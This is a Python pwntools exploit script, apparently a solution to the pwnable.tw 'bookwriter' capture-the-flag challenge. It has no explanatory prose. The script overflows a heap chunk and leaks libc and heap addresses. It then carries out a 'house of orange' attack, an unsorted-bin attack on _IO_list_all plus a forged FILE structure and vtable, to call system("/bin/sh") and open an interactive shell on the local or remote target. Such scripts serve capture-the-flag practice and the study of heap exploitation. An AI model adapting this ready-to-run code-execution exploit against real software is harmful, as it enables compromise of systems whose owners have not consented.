from pwn import *
import sys
#context(log_level='debug')

b = ELF("./bookwriter")
l = ELF("./libc_64.so.6")

def add(data, size):
	p.sendafter('choice :', '1')
	p.sendafter('page :', str(size))
	p.sendafter('Content :', data)

def view(index):
	p.sendafter('choice :', '2')
	p.sendafter('page :', str(index))

def edit(index, data):
	p.sendafter('choice :', '3')
	p.sendafter('page :', str(index))
	p.sendafter('Content:', data)

def info(yn, author=''):
	p.sendafter('choice :', '4')
	result = p.recvuntil("yes:1")
	p.sendlineafter('no:0)', str(yn))

	if yn == '1':
		p.sendafter("Author :", author)
	return result

if len(sys.argv) == 1:
	p = process("./bookwriter", env={'LD_PRELOAD':'./libc_64.so.6'})
else:
	p = remote("chall.pwnable.tw", 10304)

p.sendafter("Author :", "a"*0x40)
add("", 0)

# trigger sysmalloc to free
add("1"*0x68, 0x68)
edit(1, "1"*0x68)
payload = "1"*0x68 + "\x71\x0f\x00"
edit(1, payload)
add("2222", 0x1000)
add("3"*0x8, 18)

# libc leak
view(3)
p.recvuntil("3"*0x8)
leak = u64(p.recvuntil("\x7f").ljust(8, "\x00"))
libc = leak - 0x3c4188
log.info("leak = 0x%x" % leak)
log.info("libc = 0x%x" % libc)

# heap leak
leak = info(0).split("a"*0x40)[1]
leak = leak.split('\n')[0]
leak = u64(leak.ljust(8, "\x00"))
heap = leak - 0x10
log.info("leak = 0x%x" % leak)
log.info("heap = 0x%x" % heap)

# index overflow to overwrite page size
for i in range(4, 9):
	add(str(i)*0x20, 0x20)

# house of orange
fake_vtable = heap + 0xf0
system = libc + l.symbols['system']
_IO_list_all = libc + l.symbols['_IO_list_all']
main_arena = libc + 0x3c4b78
payload = p64(0) * 28
payload += p64(system) * 8
payload += "\x00" * 0x70
payload += "/bin/sh\x00"
payload += p64(0x61)			# for inserting into smallbin
payload += p64(0)
payload += p64(_IO_list_all - 0x10)	# unsorted bin attack
payload += p64(0) + p64(1)
payload += "\x00" * 0xa8
payload += p64(fake_vtable)
edit(0, payload)

p.sendafter('choice :', '1')
p.sendafter('page :', str(16))
p.interactive()
